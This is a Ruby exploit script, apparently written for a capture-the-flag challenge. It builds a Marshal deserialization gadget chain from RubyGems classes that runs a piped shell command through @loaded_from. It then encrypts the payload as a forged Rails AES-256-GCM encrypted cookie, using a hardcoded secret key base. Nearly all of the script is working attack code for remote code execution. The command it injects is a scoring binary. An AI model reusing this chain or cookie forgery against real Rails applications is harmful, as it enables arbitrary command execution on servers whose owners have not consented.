# may need to use https://replit.com/languages/ruby
require 'openssl'
require 'base64'

class Gem::StubSpecification
    def initialize; end
    end


    stub_specification = Gem::StubSpecification.new
    stub_specification.instance_variable_set(:@loaded_from, "|/usr/local/bin/score 8960b64a-fb41-40dc-ac1f-ac406dc9a461")

    puts "STEP n"
    stub_specification.name rescue nil
    puts


    class Gem::Source::SpecificFile
    def initialize; end
    end

    specific_file = Gem::Source::SpecificFile.new
    specific_file.instance_variable_set(:@spec, stub_specification)

    other_specific_file = Gem::Source::SpecificFile.new

    puts "STEP n-1"
    specific_file <=> other_specific_file rescue nil
    puts


    $dependency_list= Gem::DependencyList.new
    $dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

    puts "STEP n-2"
    $dependency_list.each{} rescue nil
    puts


    class Gem::Requirement
    def marshal_dump
        [$dependency_list]
    end
    end

    payload = Marshal.dump(Gem::Requirement.new)

    puts "STEP n-3"
    Marshal.load(payload) rescue nil
    puts


    puts "VALIDATION (in fresh ruby process):"
    IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
    pipe.print payload
    pipe.close_write
    puts pipe.gets
    puts
    end

    puts "Payload (hex):"
    puts payload.unpack('H*')[0]
    puts


    require "base64"
    puts "Payload (Base64 encoded):"
    puts Base64.encode64(payload)

def secret
    key = "9568c43bf9ee6f3a2363a20308318cd5d68f39881712407d871ef9409e8b8151c821e778ba99bc977e14d05bf88b6c42219358be99de0962e82ca6098888d909" # from decryptor scripr
    salt = "authenticated encrypted cookie" # from code base github
    cipher = "aes-256-gcm"
    iterations=1000
    OpenSSL::PKCS5.pbkdf2_hmac_sha1(key, salt,iterations, OpenSSL::Cipher.new("aes-256-gcm").key_len)
end

cipher = OpenSSL::Cipher.new("aes-256-gcm")
cipher.encrypt
cipher.key = secret

# Rely on OpenSSL for the initialization vector
iv = cipher.random_iv
cipher.auth_data = ""

encrypted_data  = cipher.update(payload)
encrypted_data << cipher.final

blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
blob

require 'uri'
puts URI.escape(blob, "=/+")



